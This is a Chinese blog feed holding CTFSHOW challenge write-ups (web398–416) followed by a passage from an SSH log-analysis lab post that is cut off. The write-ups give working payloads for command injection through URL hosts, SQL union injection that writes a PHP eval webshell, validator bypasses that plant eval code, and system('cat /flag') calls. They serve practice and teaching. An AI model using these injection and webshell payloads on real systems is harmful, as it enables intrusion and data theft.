class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://$(ls)/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://$(cat fl0g.php)/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><h3 id="web399"><a href="#web399" class="headerlink" title="web399"></a>web399</h3><p>对host<strong>过滤了分号和&gt;</strong>，影响的还是步骤三，步骤一和步骤二不影响</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820163409266.png"></p><p><strong>方法一：反引号执行系统命令</strong></p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://`ls`/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://`cat fl0g.php`/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p><strong>方法二：$()执行系统命令</strong></p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://$(ls)/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://$(cat fl0g.php)/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><h3 id="web400"><a href="#web400" class="headerlink" title="web400"></a>web400</h3><p>在web399的基础上<strong>多过滤了http和https</strong>，且不区分大小写，不过影响不大，步骤跟上题一样</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820163720550.png"></p><p><strong>方法一：反引号执行系统命令</strong></p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://`ls`/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://`cat fl0g.php`/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p><strong>方法二：$()执行系统命令</strong></p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://$(ls)/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://$(cat fl0g.php)/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><h3 id="web401"><a href="#web401" class="headerlink" title="web401"></a>web401</h3><p>这题把解析后的URL打印了出来，然后比上题<strong>多过滤了反斜杠</strong>，不过不影响做题</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820165009918.png"></p><p><strong>方法一：反引号执行系统命令</strong></p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://`ls`/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://`cat fl0g.php`/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p><strong>方法二：$()执行系统命令</strong></p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://$(ls)/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://$(cat fl0g.php)/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><h3 id="web402"><a href="#web402" class="headerlink" title="web402"></a>web402</h3><p>这题对scheme协议做了过滤，要求不能出现http和https，随便输入个东西替换即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820170019502.png"></p><p><strong>方法一：反引号执行系统命令</strong></p><p>把http换成1，然后跟之前一样传参即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=1://`ls`/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820170255154.png"></p><p>读取1.txt内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820170352451.png"></p><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=1://`cat fl0g.php`/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820170320485.png"></p><p><strong>方法二：$()执行系统命令</strong></p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=1://$(ls)/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=1://$(cat fl0g.php)/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><h3 id="web403"><a href="#web403" class="headerlink" title="web403"></a>web403</h3><p>先看看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820170825682.png"></p><p>过滤规则改了，我们分析一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)$/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br></pre></td></tr></table></figure><p>这段代码用正则表达式判断 <code>$url[&#39;host&#39;]</code> 是否是一个<strong>合法的IPv4地址</strong>。具体解释如下：</p><ul><li><code>/^...$/</code> ：匹配<strong>整个字符串</strong>（从头到尾），保证整个输入就是IP，不夹杂其他字符</li><li><code>((2[0-4]\d|25[0-5]|[1]?\d\d?)\.)&#123;3&#125;</code> ：匹配前三段，每段<strong>数字+点</strong>。每段数字规则如下：<ul><li><code>2[0-4]\d</code>：匹配200-249</li><li><code>25[0-5]</code>：匹配250-255</li><li><code>?\d\d?</code>：匹配0-199（包括1位、2位、3位数字，即0-9、00-99、100-199）</li></ul></li><li>最后一段没有点，只剩数字部分，规则同上</li></ul><p>综合起来，这个正则表达式能精确匹配<strong>0.0.0.0~255.255.255.255</strong>范围内的IPv4地址格式</p><p>因此之前的方法一和方法二都用不了，但是方法三可以用了，咱们用分号截断之前的命令并执行新命令</p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.1/1;echo `ls` &gt; 1.txt</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820172301463.png"></p><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.1/1;echo `cat fl0g.php` &gt; 1.txt</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820172355894.png"></p><h3 id="web404"><a href="#web404" class="headerlink" title="web404"></a>web404</h3><p>这题说起来挺好笑的，刚开始看到标题写了“容器生成较慢，得多等一会儿”，我真以为要多等一会，硬生生等了几十分钟，结果点进去还是404，就觉得奇怪。后面看到图片还一闪一闪的，好家伙这网页还带自动刷新的，发现不对劲后点开源码看看，结果真被坑了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820180155265.png"></p><p>后面想了一会，应该是因为这题是web404，估计官方想借此整活，也是被气笑了</p><p>回归正题，我们看到源码里写了<code>404.php</code>，拼接进网页访问</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820180447119.png"></p><p>可以看到比上题多了个正则匹配</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/[A-Za-z0-9]+$/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]))&#123;</span><br></pre></td></tr></table></figure><p>简单来说，这个正则表达式检测的字符串必须是：</p><ul><li>以斜杠 <code>/</code> 开头</li><li>斜杠后面跟着至少一个字母或数字</li><li>整个字符串中不能有空格或其他符号</li></ul><p>比如符合的路径有：</p><ul><li><code>/abc</code></li><li><code>/A1B2C3</code></li><li><code>/12345</code></li></ul><p>然后host部分的正则匹配也改了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)./&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li><code>(2[0-4]\d|25[0-5]|[1]?\d\d?)</code> 是0-255范围内的一段数字</li><li><code>((...)\.)&#123;3&#125;</code> 表示前三个数字段加点</li></ul><p>但因为最后的<code>.</code>是匹配<strong>任意字符</strong>，该正则会匹配形如“192.168.1.1a”或“10.0.0.1&#x2F;”这类，末尾允许<strong>至少跟着一个字符</strong>，不是严格的IP地址校验。而且也没有用开头 ^ 和结尾 $ 锚点来表示必须完全匹配整个字符串，这给了我们机会，可以用<strong>分号截断命令</strong></p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.1;echo `ls` &gt; 1.txt;/1</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820181549912.png"></p><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.1;echo `cat fl0g.php` &gt; 1.txt;/1</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820181638133.png"></p><h3 id="web405"><a href="#web405" class="headerlink" title="web405"></a>web405</h3><p>先看看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820183217894.png"></p><p>这次多了对scheme的检测，要求必须包含波浪号、点号或者php字符其中之一，因此我们改一下协议即可，方法跟之前一样</p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=php://127.0.0.1;echo `ls` &gt; 1.txt;/1</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=php://127.0.0.1;echo `cat fl0g.php` &gt; 1.txt;/1</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820183649958.png"></p><h3 id="web406"><a href="#web406" class="headerlink" title="web406"></a>web406</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820190938766.png"></p><p>源码提示<code>flag in db</code>，说明flag放在数据库。然后对传入的参数url进行了过滤，去除了无效url地址</p><p>用<strong>联合注入</strong>写入webshell即可，空格用<code>/**/</code>代替，不然会不行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.1/&#x27;union/**/select/**/1,&#x27;&lt;?=eval($_POST[1]);?&gt;&#x27;/**/into/**/outfile/**/&#x27;/var/www/html/1.php#</span><br></pre></td></tr></table></figure><p>然后打开<code>1.txt</code>查看，可以看到成功写入</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820193733048.png"></p><p>蚁剑连接webshell即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820193827881.png"></p><p>可以看到有个<code>config.php</code>配置文件</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250820193919455.png"></p><p>打开可以获取数据库账号密码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820193954972.png"></p><p>然后打开数据库操作页面</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820194044451.png"></p><p>添加数据库，如图所示</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820194125236.png"></p><p>成功找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820194207134.png"></p><h3 id="web407"><a href="#web407" class="headerlink" title="web407"></a>web407</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820200550677.png"></p><p>这题改成了要求输入参数ip，且要求必须为IP地址以通过<code>FILTER_VALIDATE_IP</code>验证</p><p>然后我们的目标是执行cafe类的add函数，可以用<code>::</code>来调用函数</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=cafe::add</span><br></pre></td></tr></table></figure><p>cafe::add会被当成IPv6地址，从而通过<code>FILTER_VALIDATE_IP</code>验证，展开的话就类似</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cafe:0000:0000:0000:0000:0000:0000:0add</span><br></pre></td></tr></table></figure><p>然后打开网页源代码查看flag即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820202126390.png"></p><p>我们分析一下IPv6构造：</p><p>IPv6地址的构造规则比较复杂，支持多种简写和压缩形式</p><ul><li>IPv6地址由8组4位十六进制数字（0-9，a-f）组成，中间用冒号 <code>:</code> 分隔，如 <code>2001:0db8:85a3:0000:0000:8a2e:0370:7334</code></li><li>可以使用双冒号 <code>::</code> 缩写连续的零，比如 <code>2001:db8::1</code> 表示中间连续的0可省略</li><li>各部分区段中的数字可以使用小写或大写的十六进制字符</li></ul><p>用个表格来概括就是</p><table><thead><tr><th align="left">特点</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">长度</td><td align="left">128位（二进制）</td></tr><tr><td align="left">分组</td><td align="left">8组，每组16位，用冒号分隔</td></tr><tr><td align="left">表示</td><td align="left">采用十六进制数字表示，每组4位</td></tr><tr><td align="left">前导零省略</td><td align="left">可省略每组开头的零</td></tr><tr><td align="left">连续多个0压缩为<code>::</code></td><td align="left">每个地址只能出现一次<code>::</code></td></tr><tr><td align="left">地址类型多样</td><td align="left">单播、组播、任播，特殊前缀表示不同用途</td></tr><tr><td align="left">IPv4兼容和过渡地址</td><td align="left">支持将IPv4嵌入IPv6地址</td></tr><tr><td align="left">接口标识符自动生成</td><td align="left">通过EUI-64等标准根据MAC生成</td></tr></tbody></table><p>例如，典型IPv6地址是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2001:0db8:85a3::8a2e:0370:7334</span><br></pre></td></tr></table></figure><p>它等价于展开的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2001:0db8:85a3:0000:0000:8a2e:0370:7334</span><br></pre></td></tr></table></figure><h3 id="web408"><a href="#web408" class="headerlink" title="web408"></a>web408</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820210526263.png"></p><p>这次改成了验证是否满足邮箱格式了，我们介绍一下<code>FILTER_VALIDATE_EMAIL</code></p><p><code>FILTER_VALIDATE_EMAIL</code> 是 PHP 内置的一个专门用来<strong>验证电子邮件格式是否合法</strong>的过滤器</p><p>它会根据<strong>RFC 5322标准</strong>对邮箱格式做校验，包括：</p><ul><li>检查是否存在且且只有一个 <code>@</code> 符号</li><li><code>@</code> 前面的部分是邮箱用户名，允许的字符包括字母、数字、点 (<code>.</code>)、下划线 (<code>_</code>) 和连字符 (<code>-</code>) 等</li><li><code>@</code> 后面的部分是邮箱域名，必须包含有效的域名格式，比如 <code>example.com</code>，包含至少一个点号 (<code>.</code>)，并且顶级域名部分也要正确</li><li>避免使用不合法或不允许的特殊字符</li><li>验证邮箱的整体格式符合国际标准，不过不验证邮箱是否真实存在</li></ul><p>然后<code>file_put_contents</code>格式为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(string $filename, mixed $data [, int $flags = 0 [, resource $context]])</span><br></pre></td></tr></table></figure><ul><li><code>$filename</code>：要写入的文件路径和名称，如果文件不存在，则会自动创建</li><li><code>$data</code>：写入文件的数据，可以是字符串、数组或者流资源</li><li><code>$flags</code>（可选）：<ul><li><code>FILE_APPEND</code>：将数据追加到文件末尾，而不是覆盖</li><li><code>LOCK_EX</code>：写入时给文件加独占锁，以防止其他进程同时写入导致数据混乱</li><li><code>FILE_USE_INCLUDE_PATH</code>：在包含路径中搜索文件</li></ul></li><li><code>$context</code>（可选）：用于修改资源流的行为</li></ul><p>可以把非法字符放在双引号里绕过email@的前缀限制，因此payload为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?email=&quot;&lt;?=eval($_POST[1]);?&gt;&quot;@1.php</span><br></pre></td></tr></table></figure><p>然后蚁剑连接</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820211220264.png"></p><p>在根目录找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820211245618.png"></p><h3 id="web409"><a href="#web409" class="headerlink" title="web409"></a>web409</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820213147394.png"></p><p>会过滤掉任意字符后的flag，这题我们可以通过闭合PHP代码来做</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?email=&quot;flageval($_POST[1]);?&gt;&quot;@1.com</span><br></pre></td></tr></table></figure><p>通过在前面加上<code>flag</code>来触发<code>$email=preg_replace(&#39;/.flag/&#39;, &#39;&#39;, $email);</code>这一行代码，会删掉前面的<code>&quot;flag</code>，接着<code>?&gt;</code>闭合代码</p><p>然后POST传参执行命令即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820223536813.png"></p><p>读取flag即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820223953048.png"></p><h3 id="web410"><a href="#web410" class="headerlink" title="web410"></a>web410</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820230748593.png"></p><p>这次是通过布尔判断输入的b是否是”1“</p><p>根据PHP文档，<code>FILTER_VALIDATE_BOOLEAN</code> 会把下列字符串（不区分大小写）视为<strong>true</strong>：</p><ul><li><code>&quot;1&quot;</code></li><li><code>&quot;true&quot;</code></li><li><code>&quot;on&quot;</code></li><li><code>&quot;yes&quot;</code></li></ul><p>以下对应的字符串（不区分大小写）视为<strong>false</strong>：</p><ul><li><code>&quot;0&quot;</code></li><li><code>&quot;false&quot;</code></li><li><code>&quot;off&quot;</code></li><li><code>&quot;no&quot;</code></li><li><code>&quot;&quot;</code>（空字符串）</li></ul><p>然后题目过滤了大于0的数字和true字符串，那我们传入on和yes都可以，大小写都行</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b=yes</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b=on</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820231040237.png"></p><h3 id="web411"><a href="#web411" class="headerlink" title="web411"></a>web411</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820234813468.png"></p><p>跟上题一样，不过这次把on的大小写过滤了，我们用yes或TRUE等都可以，太多方法可以绕过了</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b=yes</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820235040393.png"></p><h3 id="web412"><a href="#web412" class="headerlink" title="web412"></a>web412</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820235321932.png"></p><p>这次是POST传参ctfshow，然后添加到<code>flag.php</code>末尾，同时前面还有个注释符<code>//</code></p><p>用<code>%0a</code>换行即可</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=%0aeval($_POST[1]);</span><br></pre></td></tr></table></figure><p>然后蚁剑连接webshell</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821000718225.png"></p><p>在<code>flag.php</code>找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821000748134.png"></p><h3 id="web413"><a href="#web413" class="headerlink" title="web413"></a>web413</h3><p>这题相比上一题，注释的方式改了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821001112335.png"></p><p>ctfshow变量被包含在多行注释符<code>/**/</code>里面了</p><p>只需前后加个注释符即可</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=*/eval($_POST[1]);/*</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250821001622283.png"></p><p>然后跟上题一样，蚁剑连接webshell，在<code>flag.php</code>找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821001650368.png"></p><h3 id="web414"><a href="#web414" class="headerlink" title="web414"></a>web414</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821002329949.png"></p><p>我们简单分析一下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ($ctfshow == true)</span><br></pre></td></tr></table></figure><p>判断变量<code>$ctfshow</code>是否等于<code>true</code>，只有在<code>$ctfshow</code>为真时，才会执行内部判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqrt($ctfshow) &gt;= sqrt(intval($flag))</span><br></pre></td></tr></table></figure><ul><li><code>sqrt()</code>是取平方根函数</li><li><code>intval($flag)</code>将<code>$flag</code>转换为整数</li><li>判断<code>$ctfshow</code>的平方根是否大于等于<code>$flag</code>整数值的平方根</li></ul><p>只有当<code>$ctfshow</code>的平方根小于<code>$flag</code>整数的平方根时，才会显示flag</p><p>然后我们再来分析<strong>一般情况</strong>下布尔判断条件</p><p><strong>被视为 false 的值：</strong></p><ul><li>布尔 <code>false</code></li><li>整数 0</li><li>浮点数 0.0</li><li>空字符串 <code>&quot;&quot;</code>（包含字符串 “0”）</li><li>字符串 <code>&quot;0&quot;</code></li><li>空数组 <code>[]</code></li><li><code>NULL</code></li></ul><p><strong>被视为 true 的值：</strong></p><ul><li>任意非零数字，例如<code>1</code>、<code>-1</code>、<code>3.14</code></li><li>非空字符串，且不等于 <code>&quot;0&quot;</code>，如 <code>&quot;false&quot;</code>、<code>&quot;off&quot;</code>、<code>&quot;hello&quot;</code> 等都会被认为是真</li><li>非空数组</li><li>资源类型</li><li>对象</li></ul><p>因此这题我们只要传入<strong>非零负数</strong>即可成功通过验证</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctfshow=-1</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250821003042661.png"></p><h3 id="web415"><a href="#web415" class="headerlink" title="web415"></a>web415</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821003515914.png"></p><p>在PHP中，<strong>函数名是不区分大小写的</strong>，这意味着定义函数时用的名字，如<code>getflag()</code>，在调用时可以写成<code>getflag()</code>、<code>GetFlag()</code>、<code>GETFLAG()</code>等，都会被正确识别并调用</p><p>不过需要注意的是，虽然函数名调用不区分大小写，但<strong>变量名是区分大小写的</strong></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?k=getFlag</span><br></pre></td></tr></table></figure><p>然后源代码查看flag即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821003727390.png"></p><h3 id="web416"><a href="#web416" class="headerlink" title="web416"></a>web416</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821004434525.png"></p><p>我们要调用的是ctf类中的flag方法，直接用<strong>双冒号操作符</strong>即可</p><p>补充解释一下，它主要用于：</p><ul><li>访问类的<strong>静态属性</strong>和<strong>静态方法</strong></li><li>访问类的常量</li><li>调用父类（<code>parent::</code>）、当前类（<code>self::</code>）、或静态绑定类（<code>static::</code>）的成员</li></ul><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=ctf::flag</span><br></pre></td></tr></table></figure><p>然后源代码查看flag即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821004647785.png"></p>]]></content>
    
    
    <summary type="html">CTFSHOW 其他篇第一部分详细题解</summary>
    
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/categories/CTFSHOW/"/>
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/tags/CTFSHOW/"/>
    
    <category term="CTF练习" scheme="https://waynejoon.github.io/tags/CTF%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>玄机靶场 | 日志分析-ssh日志分析</title>
    <link href="https://waynejoon.github.io/posts/Xuanji-CTF-SSH-Log-Analysis/"/>
    <id>https://waynejoon.github.io/posts/Xuanji-CTF-SSH-Log-Analysis/</id>
    <published>2025-08-19T07:37:26.000Z</published>
    <updated>2025-08-19T07:44:37.579Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SSH连接端口222，账号：root，密码：toor</p><h2 id="SSH日志分析常用思路"><a href="#SSH日志分析常用思路" class="headerlink" title="SSH日志分析常用思路"></a>SSH日志分析常用思路</h2><p>SSH日志分析是应急响应与安全审计的核心。通过审查配置文件和登录日志，可以快速发现未授权访问、定位攻击源并核查安全基线。标准的分析流程如下：</p><p><strong>1. 审查配置：确认“规则”</strong></p><p>分析日志前，先看SSH服务的核心配置文件 <strong><code>/etc/ssh/sshd_config</code></strong>，了解允许哪些行为</p><ul><li><strong>访问控制</strong>：检查 <code>AllowUsers</code>, <code>AllowGroups</code> 等指令，确定谁可以登录</li><li><strong>认证方式</strong>：检查 <code>PasswordAuthentication</code> 是否开启，是否仅允许密钥登录</li><li><strong>高危设置</strong>：检查 <code>PermitRootLogin</code> 是否允许root直接登录</li></ul><p><strong>2. 分析日志：发现“事件”</strong></p><p>根据系统，主要分析以下认证日志（包括 <code>.1</code>, <code>.gz</code> 等归档文件）：</p><ul><li>Debian&#x2F;Ubuntu: <strong><code>/var/log/auth.log</code></strong></li><li>CentOS&#x2F;RHEL: <strong><code>/var/log/secure</code></strong></li></ul><p>重点关注包含以下关键字的日志条目：</p><ul><li><strong>成功登录</strong>：<code>Accepted password</code> 或 <code>Accepted publickey</code> 等</li><li><strong>登录失败</strong>：<code>Failed password</code> 、<code>Failed publickey</code> 或 <code>invalid user</code> 等</li><li><strong>用户切换&#x2F;提权</strong>：<code>session opened for user</code> (常用于追踪<code>sudo</code>等操作)</li></ul><p><strong>3. 聚合统计：提取“情报”</strong></p><p>使用命令行工具（如 <code>grep</code>, <code>awk</code>, <code>sort</code>, <code>uniq</code>）从海量日志中提取有价值的信息，回答关键问题：</p><ul><li><strong>攻击来源</strong>：哪个IP发起了最多的失败尝试？</li><li><strong>爆破目标</strong>：哪个用户名被攻击次数最多？</li><li><strong>成功渗透</strong>：哪些用户和IP成功登录了系统？</li><li><strong>行为画像</strong>：梳理单个IP或用户的完整活动时间线</li></ul><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p><img src="https://oss.waynejoons.icu/picphoto/20250819150456749.png"></p><h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤#1"></a>步骤#1</h3><p><strong>可以登录 SSH 的账号数量是多少</strong></p><p>我们先了解什么是<code>sshd_config</code>文件</p><p><code>sshd_config</code> 是 SSH 服务器（sshd）的主配置文件，用于配置 SSH 服务端的各种参数和行为</p><ul><li>设置 SSH 服务器监听的端口号（默认22端口）</li><li>指定允许或禁止的登录方式（密码认证、公钥认证等）</li><li>是否允许 root 